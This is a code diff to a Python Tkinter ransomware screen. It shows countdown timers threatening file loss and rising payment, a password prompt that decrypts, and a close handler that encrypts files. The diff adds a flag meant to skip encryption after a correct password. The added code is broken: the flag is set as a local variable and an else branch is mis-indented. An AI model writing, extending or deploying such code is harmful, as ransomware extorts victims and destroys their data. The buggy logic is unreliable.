@@ -9,7 +9,7 @@ TIMER1_LABEL = "You will lose all your files in"
 TIMER2_LABEL = "Payment price will increase in"
 TIMER1_START = 24 * 3600 + 30 * 60 + 32   # 24:30:32
 TIMER2_START = 12 * 3600 +  0 * 60 + 55   # 12:00:55
-
+State = False
 BG       = "#1a1a2e"
 PANEL_BG = "#16213e"
 ACCENT   = "#00d4ff"
@@ -174,6 +174,7 @@ def clear_password():
 def on_login():
     if pw.get() == PASSWORD:
         decrypt()
+        State = True
         custom_popup("DECRYPTION", "Decryption successful.\nAll files have been restored.")
     else:
         custom_popup("ACCESS DENIED", "Incorrect password.\nPlease try again.")
@@ -189,9 +190,16 @@ tk.Button(bottom, text="Decrypt", bg=ACCENT, fg="#0f3460", relief=tk.FLAT,
 
 
 # ── Close triggers encryption ──────────────────────────
-def on_close():
-    encrypt()
-    root.destroy()
+def Caser():
+    if State ==  True:
+       def close():
+          root.destroy()
+       close()
+     else:
+       def on_close():
+          encrypt()
+          root.destroy()
+       on_close()
 
-root.protocol("WM_DELETE_WINDOW", on_close)
+root.protocol("WM_DELETE_WINDOW", Caser)
 root.mainloop()
